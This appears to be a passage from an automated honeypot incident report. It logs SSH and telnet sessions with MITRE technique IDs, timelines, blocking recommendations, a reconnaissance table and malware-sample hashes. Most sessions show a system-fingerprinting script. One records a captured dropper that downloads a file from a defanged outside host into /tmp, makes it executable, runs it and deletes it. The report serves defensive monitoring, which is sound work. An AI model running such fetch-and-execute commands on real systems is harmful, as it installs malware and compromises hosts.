| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:41:30` | `cowrie.session.connect` |
| `2026-08-20 16:41:31` | `cowrie.client.version` |
| `2026-08-20 16:41:31` | `cowrie.client.kex` |
| `2026-08-20 16:41:32` | `cowrie.login.success` |
| `2026-08-20 16:41:34` | `cowrie.session.params` |
| `2026-08-20 16:41:34` | `cowrie.command.input` |
| `2026-08-20 16:41:34` | `cowrie.command.input` |
| `2026-08-20 16:41:34` | `cowrie.command.input` |
| `2026-08-20 16:41:34` | `cowrie.command.input` |
| `2026-08-20 16:41:34` | `cowrie.command.input` |
| `2026-08-20 16:41:34` | `cowrie.command.success` |
| `2026-08-20 16:41:34` | `cowrie.command.input` |
| `2026-08-20 16:41:34` | `cowrie.command.input` |
| `2026-08-20 16:41:34` | `cowrie.command.input` |
| `2026-08-20 16:41:34` | `cowrie.command.input` |
| `2026-08-20 16:41:34` | `cowrie.log.closed` |
| `2026-08-20 16:41:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49a966ab26ee

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 16:43 |
| **Last Seen** | 2026-08-20 16:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:43:04` | `cowrie.session.connect` |
| `2026-08-20 16:43:04` | `cowrie.client.version` |
| `2026-08-20 16:43:04` | `cowrie.client.kex` |
| `2026-08-20 16:43:05` | `cowrie.login.success` |
| `2026-08-20 16:43:06` | `cowrie.session.params` |
| `2026-08-20 16:43:06` | `cowrie.command.input` |
| `2026-08-20 16:43:06` | `cowrie.command.input` |
| `2026-08-20 16:43:06` | `cowrie.command.input` |
| `2026-08-20 16:43:06` | `cowrie.command.input` |
| `2026-08-20 16:43:06` | `cowrie.command.input` |
| `2026-08-20 16:43:06` | `cowrie.command.success` |
| `2026-08-20 16:43:06` | `cowrie.command.input` |
| `2026-08-20 16:43:06` | `cowrie.command.input` |
| `2026-08-20 16:43:06` | `cowrie.command.input` |
| `2026-08-20 16:43:06` | `cowrie.command.input` |
| `2026-08-20 16:43:07` | `cowrie.log.closed` |
| `2026-08-20 16:43:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-556a6fbc011d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 16:44 |
| **Last Seen** | 2026-08-20 16:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:44:41` | `cowrie.session.connect` |
| `2026-08-20 16:44:41` | `cowrie.client.version` |
| `2026-08-20 16:44:41` | `cowrie.client.kex` |
| `2026-08-20 16:44:43` | `cowrie.login.success` |
| `2026-08-20 16:44:44` | `cowrie.session.params` |
| `2026-08-20 16:44:44` | `cowrie.command.input` |
| `2026-08-20 16:44:44` | `cowrie.command.input` |
| `2026-08-20 16:44:44` | `cowrie.command.input` |
| `2026-08-20 16:44:44` | `cowrie.command.input` |
| `2026-08-20 16:44:44` | `cowrie.command.input` |
| `2026-08-20 16:44:44` | `cowrie.command.success` |
| `2026-08-20 16:44:44` | `cowrie.command.input` |
| `2026-08-20 16:44:44` | `cowrie.command.input` |
| `2026-08-20 16:44:44` | `cowrie.command.input` |
| `2026-08-20 16:44:44` | `cowrie.command.input` |
| `2026-08-20 16:44:45` | `cowrie.log.closed` |
| `2026-08-20 16:44:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c19930b5178

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 16:46 |
| **Last Seen** | 2026-08-20 16:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:46:01` | `cowrie.session.connect` |
| `2026-08-20 16:46:01` | `cowrie.client.version` |
| `2026-08-20 16:46:01` | `cowrie.client.kex` |
| `2026-08-20 16:46:04` | `cowrie.login.success` |
| `2026-08-20 16:46:05` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:46:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 16:46:06` | `cowrie.direct-tcpip.data` |
| `2026-08-20 16:46:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a261143737b4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 16:46 |
| **Last Seen** | 2026-08-20 16:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:46:26` | `cowrie.session.connect` |
| `2026-08-20 16:46:26` | `cowrie.client.version` |
| `2026-08-20 16:46:26` | `cowrie.client.kex` |
| `2026-08-20 16:46:28` | `cowrie.login.success` |
| `2026-08-20 16:46:30` | `cowrie.session.params` |
| `2026-08-20 16:46:30` | `cowrie.command.input` |
| `2026-08-20 16:46:30` | `cowrie.command.input` |
| `2026-08-20 16:46:30` | `cowrie.command.input` |
| `2026-08-20 16:46:30` | `cowrie.command.input` |
| `2026-08-20 16:46:30` | `cowrie.command.input` |
| `2026-08-20 16:46:30` | `cowrie.command.success` |
| `2026-08-20 16:46:30` | `cowrie.command.input` |
| `2026-08-20 16:46:30` | `cowrie.command.input` |
| `2026-08-20 16:46:30` | `cowrie.command.input` |
| `2026-08-20 16:46:30` | `cowrie.command.input` |
| `2026-08-20 16:46:31` | `cowrie.log.closed` |
| `2026-08-20 16:46:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf6c8837b718

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 16:47 |
| **Last Seen** | 2026-08-20 16:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:47:07` | `cowrie.session.connect` |
| `2026-08-20 16:47:07` | `cowrie.client.version` |
| `2026-08-20 16:47:08` | `cowrie.client.kex` |
| `2026-08-20 16:47:09` | `cowrie.login.success` |
| `2026-08-20 16:47:09` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:47:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 16:47:09` | `cowrie.direct-tcpip.data` |
| `2026-08-20 16:47:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ff4137ed3c3

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]26` |
| **First Seen** | 2026-08-20 16:48 |
| **Last Seen** | 2026-08-20 16:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `(cd /tmp; wget hxxp://5.182.210[.]174/ok; curl -O hxxp://5.182.210[.]174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &, cd /tmp, wget hxxp://5.182.210[.]174/ok, curl -O hxxp://5.182.210[.]174/ok, chmod +x ok` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:48:01` | `cowrie.session.connect` |
| `2026-08-20 16:48:01` | `cowrie.telnet.option` |
| `2026-08-20 16:48:01` | `cowrie.login.success` |
| `2026-08-20 16:48:02` | `cowrie.session.params` |
| `2026-08-20 16:48:02` | `cowrie.telnet.option` |
| `2026-08-20 16:48:02` | `cowrie.telnet.option` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.failed` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.success` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.failed` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.success` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.failed` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.success` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.command.failed` |
| `2026-08-20 16:48:02` | `cowrie.command.input` |
| `2026-08-20 16:48:02` | `cowrie.log.closed` |
| `2026-08-20 16:48:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cf9aa1d9805

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 16:48 |
| **Last Seen** | 2026-08-20 16:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:48:10` | `cowrie.session.connect` |
| `2026-08-20 16:48:11` | `cowrie.client.version` |
| `2026-08-20 16:48:11` | `cowrie.client.kex` |
| `2026-08-20 16:48:12` | `cowrie.login.success` |
| `2026-08-20 16:48:13` | `cowrie.session.params` |
| `2026-08-20 16:48:13` | `cowrie.command.input` |
| `2026-08-20 16:48:13` | `cowrie.command.input` |
| `2026-08-20 16:48:13` | `cowrie.command.input` |
| `2026-08-20 16:48:13` | `cowrie.command.input` |
| `2026-08-20 16:48:13` | `cowrie.command.input` |
| `2026-08-20 16:48:13` | `cowrie.command.success` |
| `2026-08-20 16:48:13` | `cowrie.command.input` |
| `2026-08-20 16:48:13` | `cowrie.command.input` |
| `2026-08-20 16:48:13` | `cowrie.command.input` |
| `2026-08-20 16:48:13` | `cowrie.command.input` |
| `2026-08-20 16:48:14` | `cowrie.log.closed` |
| `2026-08-20 16:48:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6faa2fe0918

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 16:51 |
| **Last Seen** | 2026-08-20 16:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:51:39` | `cowrie.session.connect` |
| `2026-08-20 16:51:40` | `cowrie.client.version` |
| `2026-08-20 16:51:40` | `cowrie.client.kex` |
| `2026-08-20 16:51:41` | `cowrie.login.success` |
| `2026-08-20 16:51:42` | `cowrie.session.params` |
| `2026-08-20 16:51:42` | `cowrie.command.input` |
| `2026-08-20 16:51:42` | `cowrie.command.input` |
| `2026-08-20 16:51:42` | `cowrie.command.input` |
| `2026-08-20 16:51:42` | `cowrie.command.input` |
| `2026-08-20 16:51:42` | `cowrie.command.input` |
| `2026-08-20 16:51:42` | `cowrie.command.success` |
| `2026-08-20 16:51:42` | `cowrie.command.input` |
| `2026-08-20 16:51:42` | `cowrie.command.input` |
| `2026-08-20 16:51:42` | `cowrie.command.input` |
| `2026-08-20 16:51:42` | `cowrie.command.input` |
| `2026-08-20 16:51:43` | `cowrie.log.closed` |
| `2026-08-20 16:51:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9b77c1a43ba

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 16:53 |
| **Last Seen** | 2026-08-20 16:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:53:21` | `cowrie.session.connect` |
| `2026-08-20 16:53:21` | `cowrie.client.version` |
| `2026-08-20 16:53:21` | `cowrie.client.kex` |
| `2026-08-20 16:53:23` | `cowrie.login.success` |
| `2026-08-20 16:53:24` | `cowrie.session.params` |
| `2026-08-20 16:53:24` | `cowrie.command.input` |
| `2026-08-20 16:53:24` | `cowrie.command.input` |
| `2026-08-20 16:53:24` | `cowrie.command.input` |
| `2026-08-20 16:53:24` | `cowrie.command.input` |
| `2026-08-20 16:53:24` | `cowrie.command.input` |
| `2026-08-20 16:53:24` | `cowrie.command.success` |
| `2026-08-20 16:53:24` | `cowrie.command.input` |
| `2026-08-20 16:53:24` | `cowrie.command.input` |
| `2026-08-20 16:53:24` | `cowrie.command.input` |
| `2026-08-20 16:53:24` | `cowrie.command.input` |
| `2026-08-20 16:53:25` | `cowrie.log.closed` |
| `2026-08-20 16:53:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3022e5a904f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 16:54 |
| **Last Seen** | 2026-08-20 16:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:54:57` | `cowrie.session.connect` |
| `2026-08-20 16:54:57` | `cowrie.client.version` |
| `2026-08-20 16:54:57` | `cowrie.client.kex` |
| `2026-08-20 16:54:58` | `cowrie.login.success` |
| `2026-08-20 16:55:00` | `cowrie.session.params` |
| `2026-08-20 16:55:00` | `cowrie.command.input` |
| `2026-08-20 16:55:00` | `cowrie.command.input` |
| `2026-08-20 16:55:00` | `cowrie.command.input` |
| `2026-08-20 16:55:00` | `cowrie.command.input` |
| `2026-08-20 16:55:00` | `cowrie.command.input` |
| `2026-08-20 16:55:00` | `cowrie.command.success` |
| `2026-08-20 16:55:00` | `cowrie.command.input` |
| `2026-08-20 16:55:00` | `cowrie.command.input` |
| `2026-08-20 16:55:00` | `cowrie.command.input` |
| `2026-08-20 16:55:00` | `cowrie.command.input` |
| `2026-08-20 16:55:00` | `cowrie.log.closed` |
| `2026-08-20 16:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **27** | 2026-08-20 14:56 | 2026-08-20 16:54 | 33m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-20 15:06 | 2026-08-20 16:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `46.7.106[.]10` | **4** | 2026-08-20 16:40 | 2026-08-20 16:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `16.5.0[.]130` | **2** | 2026-08-20 14:59 | 2026-08-20 16:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]217` | **2** | 2026-08-20 16:29 | 2026-08-20 16:49 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `35.202.9[.]133` | **2** | 2026-08-20 15:18 | 2026-08-20 15:51 | 1m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]113` | **2** | 2026-08-20 14:56 | 2026-08-20 14:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `116.255.215[.]168` | 1 | 2026-08-20 15:09 | 2026-08-20 15:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `130.185.96[.]113` | 1 | 2026-08-20 16:25 | 2026-08-20 16:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `136.119.118[.]84` | 1 | 2026-08-20 15:25 | 2026-08-20 15:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `181.225.32[.]51` | 1 | 2026-08-20 14:58 | 2026-08-20 14:58 | 11s | 0 | `T1592` | 🟢 LOW |
| `193.142.147[.]109` | 1 | 2026-08-20 16:13 | 2026-08-20 16:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `199.45.154[.]125` | 1 | 2026-08-20 16:21 | 2026-08-20 16:21 | 15s | 0 | `T1592` | 🟢 LOW |
| `200.59.122[.]158` | 1 | 2026-08-20 16:17 | 2026-08-20 16:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.95.73[.]31` | 1 | 2026-08-20 14:59 | 2026-08-20 14:59 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-08-20 16:04 | 2026-08-20 16:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.251.137[.]156` | 1 | 2026-08-20 16:43 | 2026-08-20 16:43 | 31s | 0 | `T1592` | 🟢 LOW |
| `61.169.54[.]150` | 1 | 2026-08-20 15:15 | 2026-08-20 15:15 | 4s | 0 | `T1592` | 🟢 LOW |
| `72.229.136[.]74` | 1 | 2026-08-20 16:16 | 2026-08-20 16:16 | 10s | 0 | `T1592` | 🟢 LOW |
| `78.66.45[.]101` | 1 | 2026-08-20 16:30 | 2026-08-20 16:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `78.67.161[.]64` | 1 | 2026-08-20 14:57 | 2026-08-20 14:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.117.56[.]104` | 1 | 2026-08-20 15:10 | 2026-08-20 15:11 | 13s | 0 | `T1592` | 🟢 LOW |
| `90.230.226[.]175` | 1 | 2026-08-20 15:56 | 2026-08-20 15:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-08-20 14:58 | 2026-08-20 14:59 | 29s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
